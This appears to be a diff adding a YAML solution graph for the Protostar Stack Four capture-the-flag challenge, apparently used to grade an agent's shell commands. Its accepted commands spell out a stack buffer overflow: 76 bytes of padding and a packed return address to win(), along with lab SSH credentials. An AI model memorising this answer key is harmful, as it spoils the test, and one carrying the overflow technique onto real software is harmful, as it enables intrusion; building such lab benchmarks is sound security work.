@@ -1,0 +1,95 @@
+version: '0.5'
+graph:
+  type: reference
+challenge:
+  id: protostar_stack4
+  name: Protostar Stack Four
+  description: Overwrite the saved return address so that execution returns to win().
+attacker_context:
+  user: user
+  access:
+    method: ssh
+    credentials:
+      username: user
+      password: user
+  target:
+    host: <target-hostname-or-ip>
+    port: 22
+goal:
+  node: node3
+irrelevant_commands:
+- pwd
+- id
+- whoami
+- clear
+- history
+- uname
+- hostname
+- man
+- strings
+- checksec
+- file
+- ls
+- ls -la
+- env
+- printenv
+nodes:
+- id: start
+  type: sentinel
+  label: Start
+- id: node0
+  type: state
+  label: Saved EIP offset identified
+- id: node1
+  type: state
+  label: win() address recovered
+- id: node2
+  type: state
+  label: Return-address payload built
+- id: node3
+  type: state
+  label: Execution redirected to win()
+edges:
+- id: edge0
+  from: start
+  to: node0
+  action: find_saved_eip_offset
+  accepted_commands:
+  - gdb -q /opt/protostar/bin/stack4
+  - python -c 'print "A"*76 + "BBBB"' > /tmp/stack4.in
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*
+    stderr_regex: .*
+- id: edge1
+  from: node0
+  to: node1
+  action: recover_win_symbol_address
+  accepted_commands:
+  - objdump -t /opt/protostar/bin/stack4 | grep " win"
+  - nm /opt/protostar/bin/stack4 | grep " win"
+  transition_match:
+    exit_code: 0
+    stdout_regex: .* win.*
+    stderr_regex: ^$
+- id: edge2
+  from: node1
+  to: node2
+  action: build_saved_eip_overwrite_payload
+  accepted_commands:
+  - python -c 'import struct; print "A"*76 + struct.pack("<I", 0x080483f4)' > /tmp/stack4.in
+  - perl -e 'print "A"x76 . pack("V", 0x080483f4)' > /tmp/stack4.in
+  transition_match:
+    exit_code: 0
+    stdout_regex: ^$
+    stderr_regex: ^$
+- id: edge3
+  from: node2
+  to: node3
+  action: trigger_return_to_win
+  accepted_commands:
+  - /opt/protostar/bin/stack4 < /tmp/stack4.in
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*code flow successfully changed.*
+    stderr_regex: ^$
